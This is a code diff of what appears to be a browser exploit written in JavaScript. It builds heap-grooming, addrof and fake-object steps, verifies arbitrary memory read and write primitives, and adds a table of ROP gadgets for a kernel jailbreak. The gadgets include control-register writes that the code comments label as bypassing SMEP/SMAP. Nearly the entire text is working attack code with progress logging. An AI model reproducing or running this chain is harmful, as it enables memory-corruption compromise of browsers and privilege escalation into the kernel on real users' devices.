     for (var i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
@@ -1406,216 +725,290 @@ function prepareAddrof() {
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetView;
     mark("ADDROF-CARRIER-DONE", "host-target-host-target");
+
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
     mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
+
     setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
     setTimeout(beginComposition, COMPOSE_DELAY_MS);
 }
+
 function runAddrofCapture() {
     try {
         capturedString = symbolToString.call(preparedSymbolObject);
         copiedLength = capturedString.length;
         for (var i = 0; i < 16; i++) capturedWords[i] = capturedString.charCodeAt(7 + i);
         captureState = 1;
-    } catch (error) { captureError = error; captureState = -1; }
+    } catch (error) {
+        captureError = error;
+        captureState = -1;
+    }
 }
+
 function fillRawCellPointers(backing, pointer) {
     pointerHigh = Math.floor(pointer / 0x100000000);
     pointerLow = pointer - pointerHigh * 0x100000000;
-    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff ||
-        Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 0xffffffff ||
-        pointerLow + pointerHigh * 0x100000000 !== pointer)
+
+    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff || Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 0xffffffff || pointerLow + pointerHigh * 0x100000000 !== pointer)
         throw new Error("invalid-low48-fake-address");
+
     predecessorWords = new Uint32Array(backing);
     for (var i = 0; i < predecessorWords.length; i += 2) {
-        predecessorWords[i] = pointerLow; predecessorWords[i+1] = pointerHigh;
+        predecessorWords[i] = pointerLow;
+        predecessorWords[i+1] = pointerHigh;
     }
+
     var last = predecessorWords.length - 2;
-    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh ||
-        predecessorWords[last] !== pointerLow || predecessorWords[last+1] !== pointerHigh)
+    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh || predecessorWords[last] !== pointerLow || predecessorWords[last+1] !== pointerHigh)
         throw new Error("pointer-fill-verification-failed");
 }
-function clearPredecessor() { if (predecessorWords !== null) predecessorWords.fill(0); }
+
+function clearPredecessor() {
+    if (predecessorWords !== null) predecessorWords.fill(0);
+}
+
 function loadHistoryCritical() {
-    var result = null, candidate = null, rwHeaderCaptured = false, rwVectorTouched = false;
+    var result = null;
+    var candidate = null;
+    var rwHeaderCaptured = false;
+    var rwVectorTouched = false;
     try {
         result = history.state;
         compositionLength = result.length;
+
         if (compositionLength !== EXPECTED_LENGTH) {
-            result[DUPLICATE_INDEX] = undefined; result = null; clearPredecessor();
-            retrySafe = true; compositionState = 3; return;
+            result[DUPLICATE_INDEX] = undefined;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 3;
+            return;
         }
+
         if (result[1] === result[DUPLICATE_INDEX]) {
-            result[DUPLICATE_INDEX] = undefined; candidate = null; result = null;
-            clearPredecessor(); retrySafe = true; compositionState = 2; return;
+            result[DUPLICATE_INDEX] = undefined;
+            candidate = null;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 2;
+            return;
         }
+
         candidate = result[DUPLICATE_INDEX];
-        result[DUPLICATE_INDEX] = undefined; result = null;
+        result[DUPLICATE_INDEX] = undefined;
+        result = null;
+
         for (var i = 0; i < CELL_BYTES; ++i) rwHeader[i] = candidate[i];
         rwHeaderCaptured = true;
+
         var rwSID = uint32At(rwHeader, 0);
         var rwHeaderHigh = uint32At(rwHeader, 4);
         var rwButterfly = rwHeader[8] + rwHeader[9]*0x100 + rwHeader[10]*0x10000 + rwHeader[11]*0x1000000 + rwHeader[12]*0x100000000 + rwHeader[13]*0x10000000000;
         var rwVectorLow = uint32At(rwHeader, 0x10);
         var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15]*0x100;
         rwOriginalVector = rwVectorLow + rwVectorHigh*0x100000000;
+
         var rwOffsetZero = true;
         for (var rz = 0x20; rz < 0x28; ++rz) { if (rwHeader[rz] !== 0) rwOffsetZero = false; }
-        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000 && (rwSID & 0xf) === 0 && rwHeader[4] === 0 &&
-            rwHeader[5] === 0x28 && rwHeader[6] === 0x08 && (rwHeader[7] === 0 || rwHeader[7] === 1) &&
-            rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0 && rwButterfly > 0x100000000 && rwButterfly % 8 === 0 &&
-            rwHeader[0x16] === 0 && rwHeader[0x17] === 0 && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0 &&
-            rwHeader[0x18] === 0 && rwHeader[0x19] === 1 && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0 &&
-            rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0 && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0 &&
-            rwOffsetZero && rwHeader[0x28] === 0x58;
-        if (!rwHeaderOK) { candidate = null; clearPredecessor(); compositionState = 3; return; }
-        scratchWords[0] = rwSID; scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000 && (rwSID & 0xf) === 0 && rwHeader[4] === 0 && rwHeader[5] === 0x28 && rwHeader[6] === 0x08 && (rwHeader[7] === 0 || rwHeader[7] === 1) && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0 && rwButterfly > 0x100000000 && rwButterfly % 8 === 0 && rwHeader[0x16] === 0 && rwHeader[0x17] === 0 && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0 && rwHeader[0x18] === 0 && rwHeader[0x19] === 1 && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0 && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0 && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0 && rwOffsetZero && rwHeader[0x28] === 0x58;
+
+        if (!rwHeaderOK) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = rwSID;
+        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
         var upgradedHeader = scratchDouble[0];
         var upgradedFinite = upgradedHeader === upgradedHeader && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
-        if (!upgradedFinite) { candidate = null; clearPredecessor(); compositionState = 3; return; }
+        if (!upgradedFinite) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
         fakeHost.q0 = upgradedHeader;
-        if (fakeHost.q0 !== upgradedHeader) { candidate = null; clearPredecessor(); compositionState = 3; return; }
-        scratchWords[0] = targetAddressLow; scratchWords[1] = targetAddressHigh;
+        if (fakeHost.q0 !== upgradedHeader) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = targetAddressLow;
+        scratchWords[1] = targetAddressHigh;
         rwVectorTouched = true;
         for (var w1 = 0; w1 < 8; ++w1) candidate[0x10 + w1] = scratchBytes[w1];
+
         for (var j = 0; j < CELL_BYTES; ++j) targetHeader[j] = rwView[j];
+
         var targetSID = uint32At(targetHeader, 0);
         var targetButterfly = targetHeader[8] + targetHeader[9]*0x100 + targetHeader[10]*0x10000 + targetHeader[11]*0x1000000 + targetHeader[12]*0x100000000 + targetHeader[13]*0x10000000000;
         var targetVectorLow = uint32At(targetHeader, 0x10);
         var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15]*0x100;
         targetVector = targetVectorLow + targetVectorHigh*0x100000000;
+
         var targetOffsetZero = true;
         for (var tz = 0x20; tz < 0x28; ++tz) { if (targetHeader[tz] !== 0) targetOffsetZero = false; }
-        targetHeaderOK = targetSID === rwSID && targetHeader[4] === 0 && targetHeader[5] === 0x28 &&
-            targetHeader[6] === 0x08 && (targetHeader[7] === 0 || targetHeader[7] === 1) &&
-            targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0 && targetButterfly > 0x100000000 &&
-            targetButterfly % 8 === 0 && targetHeader[0x16] === 0 && targetHeader[0x17] === 0 &&
-            targetVector > 0x100000000 && targetVector % 8 === 0 && targetHeader[0x18] === 0x20 &&
-            targetHeader[0x19] === 0 && targetHeader[0x1a] === 0 && targetHeader[0x1b] === 0 &&
-            targetHeader[0x1c] === 0 && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0 &&
-            targetHeader[0x1f] === 0 && targetOffsetZero && targetHeader[0x28] === 0x58;
+        targetHeaderOK = targetSID === rwSID && targetHeader[4] === 0 && targetHeader[5] === 0x28 && targetHeader[6] === 0x08 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0 && targetButterfly > 0x100000000 && targetButterfly % 8 === 0 && targetHeader[0x16] === 0 && targetHeader[0x17] === 0 && targetVector > 0x100000000 && targetVector % 8 === 0 && targetHeader[0x18] === 0x20 && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0 && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0 && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0 && targetOffsetZero && targetHeader[0x28] === 0x58;
+
         if (!targetHeaderOK) {
             for (var r1 = 0; r1 < 8; ++r1) candidate[0x10 + r1] = rwHeader[0x10 + r1];
-            rwVectorTouched = false; candidate = null; clearPredecessor(); compositionState = 3; return;
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
         }
-        scratchWords[0] = targetVectorLow; scratchWords[1] = targetVectorHigh;
+
+        scratchWords[0] = targetVectorLow;
+        scratchWords[1] = targetVectorHigh;
         for (var w2 = 0; w2 < 8; ++w2) candidate[0x10 + w2] = scratchBytes[w2];
+
         readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
         if (!readObserved) {
             for (var rRead = 0; rRead < 8; ++rRead) candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
-            rwVectorTouched = false; targetView[0] = 0xa5; rwMirror[0] = 0x3c;
-            candidate = null; clearPredecessor(); compositionState = 3; return;
+            rwVectorTouched = false;
+            targetView[0] = 0xa5;
+            rwMirror[0] = 0x3c;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
         }
         rwView[0] = 0x5a;
         writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
         rwView[0] = 0xa5;
+
         if (readObserved && writeObserved) {
             globalFakeArray = candidate;
             mark("FAKE-RETAINED", "candidate-conserved-on-vector-modification");
         }
+
         for (var r2 = 0; r2 < 8; ++r2) candidate[0x10 + r2] = rwHeader[0x10 + r2];
-        rwVectorTouched = false; targetView[0] = 0xa5; rwMirror[0] = 0x3c;
+        rwVectorTouched = false;
+        targetView[0] = 0xa5;
+        rwMirror[0] = 0x3c;
         restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
-        candidate = null; clearPredecessor(); compositionState = 1;
+
+        candidate = null;
+        clearPredecessor();
+        compositionState = 1;
     } catch (error) {
         retrySafe = candidate === null && result === null && !rwHeaderCaptured && error && error.name === "TypeError";
         if (result !== null) { try { result[DUPLICATE_INDEX] = undefined; } catch (_) {} }
         if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
             try { for (var rr = 0; rr < 8; ++rr) candidate[0x10 + rr] = rwHeader[0x10 + rr]; } catch (_) {}
         }
-        candidate = null; result = null;
+        candidate = null;
+        result = null;
         try { targetView[0] = 0xa5; } catch (_) {}
         try { rwMirror[0] = 0x3c; } catch (_) {}
         try { clearPredecessor(); } catch (_) {}
-        compositionError = error; compositionState = -1;
+        compositionError = error;
+        compositionState = -1;
     }
 }
+
 function dumpHex(bytes) {
     var out = "";
     for (var i = 0; i < CELL_BYTES; ++i) out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
     return out;
 }
-function populateRWCard() {
-    setBadge("rw", "READY", "ok"); setCardState("rw", "ok");
-    setRow("rw", "state",   "PASS", "ok");
-    setRow("rw", "read",    readObserved ? "PASS" : "FAIL", readObserved ? "ok" : "bad");
-    setRow("rw", "write",   writeObserved ? "PASS" : "FAIL", writeObserved ? "ok" : "bad");
-    setRow("rw", "restore", restoreObserved ? "PASS" : "FAIL", restoreObserved ? "ok" : "bad");
-    setRow("rw", "host",    hex(hostAddress), "cyan");
-    setRow("rw", "fake",    hex(fakeAddress), "purple");
-    setRow("rw", "target",  hex(targetAddress), "cyan");
-    setRow("rw", "sid",     hex(uint32At(rwHeader, 0)));
-    setRow("rw", "rwhdr",   dumpHex(rwHeader));
-    setRow("rw", "tghdr",   dumpHex(targetHeader));
-}
+
 function reportComposition() {
     if (compositionState < 0) {
-        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
-            (compositionError && compositionError.name) + ":" +
-            String(compositionError && compositionError.message).slice(0, 80));
+        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
         mark("DONE-THROW", "predecessor-cleared=true");
         setTimeout(function() { mark("SURVIVED-THROW-T1000"); }, 1000);
-        failTerminal(retrySafe ? "placement-miss" : "load-threw"); return;
+        failTerminal(retrySafe ? "placement-miss" : "load-threw");
+        return;
     }
+
     if (compositionState === 2) {
         mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
         mark("DONE-MISS", "predecessor-cleared=true");
         setTimeout(function() { mark("SURVIVED-MISS-T1000"); }, 1000);
-        failTerminal("clone-miss"); return;
+        failTerminal("clone-miss");
+        return;
     }
+
     if (compositionState === 3) {
-        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK);
+        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK + "-carrier-restored=true");
         mark("RW-HEADER-HEX", dumpHex(rwHeader));
         mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
         setTimeout(function() { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
-        failTerminal("header-mismatch"); return;
+        failTerminal("header-mismatch");
+        return;
     }
+
     if (compositionState === 0) {
         mark("NO-RESULT", "critical-load-did-not-finish");
-        failTerminal("no-result"); return;
+        failTerminal("no-result");
+        return;
     }
+
     mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
-    mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector));
-    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)));
+    mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector) + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
+    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)) + "-length=0x100-mode=0x" + targetHeader[0x28].toString(16));
+    mark("RW-HEADER-HEX", dumpHex(rwHeader));
+    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+
     var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
     var writePass = writeObserved && restoreObserved;
     try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
     if (readPass) mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
-    else mark("ARBITRARY-READ-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK + "-obs=" + readObserved);
+    else mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK + "-target-header=" + targetHeaderOK + "-observed=" + readObserved + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
+
     if (writePass) mark("ARBITRARY-WRITE-PASS", "as-to-as-to-as-restored=true");
     else mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved + "-restore=" + restoreObserved);
+
     if (readPass && writePass) {
         attemptSucceeded = true;
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
-        populateRWCard();
+
+        /* ------------------------------------------------------
+         *  POST-R/W GATE — we do NOT jailbreak by default.
+         *  Default: probe kernel (dump structs + scan gadgets/ROP).
+         *  Opt-in:  ?jb=1 runs the legacy kernel jailbreak path.
+         * ------------------------------------------------------ */
         if (!testRun) {
             testRun = true;
             if (RUN_JAILBREAK) {
                 mark("JAILBREAK-GATE", "explicitly-enabled-by-url-param");
-                setBadge("gadgets", "JB MODE", "warn");
-                setCardState("gadgets", "warn");
                 setTimeout(runJailbreak, 500);
             } else {
-                mark("PROBE-GATE", "auto-starting-deep-kernel-probe");
-                setBadge("gadgets", "PROBING…", "run");
-                setCardState("gadgets", "running");
+                mark("PROBE-GATE", "auto-starting-kernel-probe (no jailbreak)");
                 setTimeout(runProbe, 500);
             }
         }
-    } else { failTerminal("rw-verify-miss", "read=" + readPass + "-write=" + writePass); }
+    } else {
+        failTerminal("rw-verify-miss", "read=" + readPass + "-write=" + writePass);
+    }
+
+    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
     setTimeout(function() { mark("SURVIVED-T100"); }, 100);
     setTimeout(function() { mark("SURVIVED-T1000"); }, 1000);
     setTimeout(function() { mark("SURVIVED-T3000"); }, 3000);
 }
+
 function runGroomAndLoad() {
     try {
         mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
         var channel = new MessageChannel();
-        channel.port1.close(); channel.port2.close();
+        channel.port1.close();
+        channel.port2.close();
+
         for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+
         var slab = buffer(SLAB_SIZE);
-        channel.port1.postMessage(0, [slab]); slab = null;
+        channel.port1.postMessage(0, [slab]);
+        slab = null;
+
         var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
         var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
         var separator = buffer(SEPARATOR_SIZE);
@@ -1623,26 +1016,35 @@ function runGroomAndLoad() {
         var guard = buffer(GUARD_SIZE);
         var predecessor = buffer(PREDECESSOR_SIZE);
         var finalHole = buffer(FINAL_HOLE_SIZE);
+
         fillRawCellPointers(predecessor, fakeAddress);
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
         keepAlive[keepIndex++] = predecessor;
         mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));
+
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
         loadHistoryCritical();
     } catch (error) {
         try { clearPredecessor(); } catch (_) {}
-        compositionError = error; compositionState = -1;
+        compositionError = error;
+        compositionState = -1;
     }
     reportComposition();
 }
+
 function beginComposition() {
-    if (captureState === 0) { mark("ADDROF-NO-RESULT", "capture-task-did-not-finish"); failTerminal("addrof-no-result"); return; }
-    if (captureState < 0) {
-        mark("ADDROF-THREW", (captureError && captureError.name) + ":" +
-            String(captureError && captureError.message).slice(0, 80));
-        failTerminal("addrof-threw"); return;
+    if (captureState === 0) {
+        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
+        failTerminal("addrof-no-result");
+        return;
     }
+    if (captureState < 0) {
+        mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
+        failTerminal("addrof-threw");
+        return;
+    }
+
     var a0 = pointerFromWords(capturedWords, 0);
     var b0 = pointerFromWords(capturedWords, 4);
     var a1 = pointerFromWords(capturedWords, 8);
@@ -1652,64 +1054,80 @@ function beginComposition() {
     var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
     var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
     var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+
     mark("ADDROF-RETURNED", REVISION);
-    mark("ADDROF-COPY", "chars=" + copiedLength + "-covered=" + sourceCovered);
-    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0));
+    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
+    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0) + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
+
     if (!(repeated && distinct && plausible && sourceCovered)) {
-        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible);
-        failTerminal("addrof-fail"); return;
+        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
+        failTerminal("addrof-fail");
+        return;
     }
-    hostAddress = a0; targetAddress = b0;
+
+    hostAddress = a0;
+    targetAddress = b0;
     targetAddressHigh = Math.floor(targetAddress / 0x100000000);
     targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
-    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 ||
-        targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow ||
-        targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
         mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
-        failTerminal("target-addr-fail"); return;
+        failTerminal("target-addr-fail");
+        return;
     }
     fakeAddress = hostAddress + 0x10;
     if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
         mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
-        failTerminal("fake-addr-fail"); return;
+        failTerminal("fake-addr-fail");
+        return;
     }
-    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress));
+    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
     runGroomAndLoad();
 }
 
-/* ============================================================
- *  R/W PRIMITIVES
- * ============================================================ */
+// ========== R/W PRIMITIVES ==========
 function read64(addr) {
     if (!globalFakeArray) return 0n;
     var oldVec = [];
     for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+
     var low = Number(BigInt(addr) & 0xFFFFFFFFn);
     var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
     for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
     for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;
+
     var val = 0n;
     for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);
+
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
     return val;
 }
+
 function write64(addr, value) {
     if (!globalFakeArray) return;
     var oldVec = [];
     for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+
     var low = Number(BigInt(addr) & 0xFFFFFFFFn);
     var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
     for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
     for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;
+
     var v = BigInt(value);
     for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);
+
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
 }
+
+/* Bulk byte reader built on the same primitive.
+ * Points the fake array's backing vector at `addr` and pulls `count` bytes
+ * out in 8-byte strides. Restores the original vector when finished. */
 function readBytes(addr, count) {
     var out = new Uint8Array(count);
     if (!globalFakeArray) return out;
+
     var oldVec = new Uint8Array(8);
     for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+
     var written = 0;
     while (written < count) {
         var curAddr = BigInt(addr) + BigInt(written);
@@ -1721,15 +1139,80 @@ function readBytes(addr, count) {
         for (var i = 0; i < n; i++) out[written + i] = globalFakeArray[i];
         written += 8;
     }
+
     for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
     return out;
 }
 
-/* ============================================================
- *  GADGET SCANNER
- * ============================================================ */
+// ========== GADGET / ROP PATTERN TABLE ==========
+/* Each entry: { name, bytes[] }. Scanning finds the first hit per gadget
+ * in each window; that is enough to build a working ROP chain later. */
+var GADGETS = [
+    // pop reg ; ret
+    { name: "pop rdi ; ret",              bytes: [0x5F, 0xC3] },
+    { name: "pop rsi ; ret",              bytes: [0x5E, 0xC3] },
+    { name: "pop rdx ; ret",              bytes: [0x5A, 0xC3] },
+    { name: "pop rcx ; ret",              bytes: [0x59, 0xC3] },
+    { name: "pop rax ; ret",              bytes: [0x58, 0xC3] },
+    { name: "pop rbx ; ret",              bytes: [0x5B, 0xC3] },
+    { name: "pop rsp ; ret",              bytes: [0x5C, 0xC3] },
+    { name: "pop rbp ; ret",              bytes: [0x5D, 0xC3] },
+    { name: "pop r8  ; ret",              bytes: [0x41, 0x58, 0xC3] },
+    { name: "pop r9  ; ret",              bytes: [0x41, 0x59, 0xC3] },
+    { name: "pop r10 ; ret",              bytes: [0x41, 0x5A, 0xC3] },
+    { name: "pop r11 ; ret",              bytes: [0x41, 0x5B, 0xC3] },
+    { name: "pop r12 ; ret",              bytes: [0x41, 0x5C, 0xC3] },
+    { name: "pop r13 ; ret",              bytes: [0x41, 0x5D, 0xC3] },
+    { name: "pop r14 ; ret",              bytes: [0x41, 0x5E, 0xC3] },
+    { name: "pop r15 ; ret",              bytes: [0x41, 0x5F, 0xC3] },
+    // stack / frame
+    { name: "leave ; ret",                bytes: [0xC9, 0xC3] },
+    { name: "pop rsp ; pop rbp ; ret",    bytes: [0x5C, 0x5D, 0xC3] },
+    { name: "add rsp, 0x28 ; ret",        bytes: [0x48, 0x83, 0xC4, 0x28, 0xC3] },
+    { name: "add rsp, 0x38 ; ret",        bytes: [0x48, 0x83, 0xC4, 0x38, 0xC3] },
+    { name: "sub rsp, 0x28 ; ret",        bytes: [0x48, 0x83, 0xEC, 0x28, 0xC3] },
+    // privilege / transitions
+    { name: "swapgs ; ret",               bytes: [0x0F, 0x01, 0xF8, 0xC3] },
+    { name: "swapgs ; iretq",             bytes: [0x0F, 0x01, 0xF8, 0x48, 0xCF] },
+    { name: "iretq",                      bytes: [0x48, 0xCF] },
+    { name: "sysretq",                    bytes: [0x48, 0x0F, 0x07] },
+    { name: "sysret",                     bytes: [0x0F, 0x07] },
+    // register moves / pivots
+    { name: "mov rdi, rax ; ...",         bytes: [0x48, 0x89, 0xC7] },
+    { name: "mov rdi, rsp ; ...",         bytes: [0x48, 0x89, 0xE7] },
+    { name: "xchg rax, rsp ; ret",        bytes: [0x48, 0x94, 0xC3] },
+    { name: "xchg edi, eax",              bytes: [0x97] },
+    // CR writes (bypass SMEP/SMAP/CR0.WP)
+    { name: "mov cr4, rdi ; ret",         bytes: [0x0F, 0x22, 0xE7, 0xC3] },
+    { name: "mov cr4, rax",               bytes: [0x0F, 0x22, 0xE0] },
+    { name: "mov cr0, rdi",               bytes: [0x0F, 0x22, 0xC7] },
+    { name: "mov cr3, rdi",               bytes: [0x0F, 0x22, 0xDF] },
+    // misc
+    { name: "ret",                        bytes: [0xC3] },
+    { name: "nop ; ret",                  bytes: [0x90, 0xC3] },
+    { name: "cli ; ret",                  bytes: [0xFA, 0xC3] },
+    { name: "sti ; ret",                  bytes: [0xFB, 0xC3] },
+    { name: "wrmsr",                      bytes: [0x0F, 0x30] },
+    { name: "rdmsr",                      bytes: [0x0F, 0x32] },
+    { name: "pushfq ; pop rax",           bytes: [0x9C, 0x58] },
+    { name: "popfq",                      bytes: [0x9D] },
+    { name: "syscall",                    bytes: [0x0F, 0x05] },
+    { name: "sysenter",                   bytes: [0x0F, 0x34] },
+    { name: "int 0x80",                   bytes: [0xCD, 0x80] },
+    { name: "int3 ; ret",                 bytes: [0xCC, 0xC3] },
+    // indirect jmps / calls — the sy_call hijack gadget falls in here
+    { name: "jmp rax",                    bytes: [0xFF, 0xE0] },
+    { name: "jmp rcx",                    bytes: [0xFF, 0xE1] },
+    { name: "jmp rdx",                    bytes: [0xFF, 0xE2] },
+    { name: "jmp rsi",                    bytes: [0xFF, 0xE6] },
+    { name: "jmp rdi",                    bytes: [0xFF, 0xE7] },
+    { name: "call rax",                   bytes: [0xFF, 0xD0] },
+    { name: "call rsi",                   bytes: [0xFF, 0xD6] },
+    { name: "call rdi",                   bytes: [0xFF, 0xD7] }
+];
+
 function scanGadgetsInWindow(startAddr, windowBytes) {
-    var found = 0;
+    var hits = [];
     try {
         var buf = readBytes(startAddr, windowBytes);
         for (var g = 0; g < GADGETS.length; g++) {
@@ -1741,403 +1224,47 @@ function scanGadgetsInWindow(startAddr, windowBytes) {
                     if (buf[i + j] !== gd.bytes[j]) { ok = false; break; }
                 }
                 if (ok) {
-                    addGadgetHit(gd.cat, gd.name, hex(BigInt(startAddr) + BigInt(i)));
-                    found++; break;
+                    hits.push({ name: gd.name, addr: BigInt(startAddr) + BigInt(i) });
+                    break; // first hit per pattern is enough
                 }
             }
         }
     } catch (err) {
-        mark("SCAN-ERROR", hex(startAddr) + ":" +
-            (err && err.message ? err.message.slice(0, 60) : "?"));
+        mark("SCAN-ERROR", hex(startAddr) + ":" + (err && err.message ? err.message.slice(0, 60) : "?"));
     }
-    return found;
-}
